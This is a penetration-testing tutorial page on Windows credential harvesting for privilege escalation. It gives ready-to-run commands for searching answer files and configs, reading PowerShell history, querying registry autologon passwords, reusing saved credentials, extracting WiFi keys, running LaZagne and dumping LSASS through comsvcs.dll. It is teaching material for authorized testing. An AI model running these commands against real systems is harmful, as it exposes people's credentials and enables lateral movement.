The most reliable Windows privesc is a password someone left lying around. No exploit, no race condition, just a working credential for a higher account. On a real network this also moves you sideways, since people reuse passwords across boxes. So after you've checked your token and the services, start looting.

## Files on disk

Unattended install files are the classic first hit. Windows deployment tools write an admin password into them and admins forget to scrub it. Check the usual spots.

<CommandBlock
  commands={[
    { cmd: "dir /s /b C:\\unattend.xml C:\\Windows\\Panther\\Unattend.xml", comment: "Deployment answer files, often with a base64 admin password" },
    { cmd: "findstr /si password *.xml *.ini *.config *.txt", comment: "Recurse the current tree for the word password" },
  ]}
/>

Broaden it once the obvious spots are dry. Web app configs, backup scripts, and a user's Documents folder all leak. PowerShell history is a goldmine because people paste credentials into commands.

<CommandCard command="type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt" explain="Every command the user typed, unfiltered. Look for -Password, connection strings, and net use lines." />

## The registry

Software stashes credentials in the registry constantly. Autologon is the highest value: if it's configured, the password sits in plaintext.

<CommandBlock
  commands={[
    { cmd: "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword", comment: "Autologon password in cleartext when set" },
    { cmd: "reg query HKLM /f password /t REG_SZ /s", comment: "Brute search of the whole hive for the word password" },
  ]}
/>

## Saved sessions and creds

Windows caches credentials for RDP, network shares, and WiFi. `cmdkey` lists what's stored, and stored creds can often be reused without ever seeing the plaintext.

<CommandBlock
  commands={[
    { cmd: "cmdkey /list", comment: "Saved RDP and network credentials for this user" },
    { cmd: "netsh wlan show profile name=\"CorpWiFi\" key=clear", comment: "Prints the WiFi PSK in cleartext under Key Content" },
  ]}
/>

If `cmdkey /list` shows a stored credential for another user, you often don't need the password at all. Launch a process as that user with `runas /savecred`, which pulls the saved secret for you.

Browsers keep saved logins too. LaZagne pulls them, along with dozens of other credential stores, in one pass.

<CommandCard command="lazagne.exe all" explain="Dumps browser, WiFi, and app-stored credentials in one run. Fast triage before you go deeper." />

## Memory

When the disk and registry come up empty and you already have admin, LSASS holds the plaintext and hashes of everyone logged in. Dumping it is loud and EDR watches for it, so it's a later move, not a first one. On an authorized engagement, dump the process and parse it offline rather than running mimikatz live where AV will eat it.

<CommandCard command="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\Temp\\lsass.dmp full" explain="Uses a signed Microsoft DLL to dump LSASS, quieter than dropping mimikatz. Parse the dump with pypykatz on your box." />

<Callout type="security" title="Authorized targets only">
Harvesting stored passwords and dumping LSASS exposes real credentials for real people. Only do this on systems you own or are explicitly authorized to test, and handle any credential material you recover as sensitive engagement data.
</Callout>

<Callout type="tip" title="Reuse beats cracking">
Before you fire up a cracker, try the password you found against other accounts and other hosts. Reuse is rampant. One config-file password often logs you into three more boxes as an admin.
</Callout>
